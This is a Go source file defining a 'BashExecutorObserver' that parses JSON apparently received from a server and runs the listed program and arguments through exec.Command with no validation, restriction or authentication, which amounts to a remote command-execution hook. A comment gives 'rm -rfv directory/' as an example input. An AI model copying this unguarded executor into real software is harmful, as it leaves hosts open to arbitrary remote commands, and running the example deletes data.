package internal

import (
	"encoding/json"
	"log"
	"os/exec"
)

// Bash executor commands Observer
type BashExecutorObserver struct {
}

// The first param is the command interpreted by the client
// not the bash command or os program
//
// @data: is an array of all bash command (or program) data
// that must be Joined into one string command
// Eg:
// "ls -l -a"
// "rm -rfv directory/"
// func (o *BashExecutorObserver) execute(cmd string, data []string) {
// 	if cmd != "bash" {
// 		return
// 	}

// 	if len(data) <= 0 {
// 		return
// 	}

// 	log.Println("BashExecutorObserver: new action triggered")

// 	// Invokes command (or program)
// 	res := o.executeCommand(data)
// 	// TODO: response to server
// 	_ = res
// }
func (o *BashExecutorObserver) execute(string_json string) {
	log.Println("BashExecutorObserver: received: ", string_json)

	var req BashRequest
	err := json.Unmarshal([]byte(string_json), &req)

	if err != nil {
		log.Println("ERRROR Unmarshing: ", err)
		return
	}

	if req.Cmd != "bash" {
		log.Println("Not a bash command", req.Cmd)
		return
	}

	res := o.executeCommand(req.Data)

	// TODO: response to server
	_ = res
}

// Executes a command (or program) directly with it's params
// @scmd: array of program and it's params for execution
func (o *BashExecutorObserver) executeCommand(scmd []string) string {
	program := scmd[0]        // First position es the command (or program). Eg: ls, rm, mkdir
	programparams := scmd[1:] // Command (or program) params

	cmdres := exec.Command(program, programparams...)
	stdout, err := cmdres.Output()

	if err != nil {
		return ""
	}

	res := string(stdout)
	return res
}

func NewBashExecutorObserver() *BashExecutorObserver {
	return &BashExecutorObserver{}
}
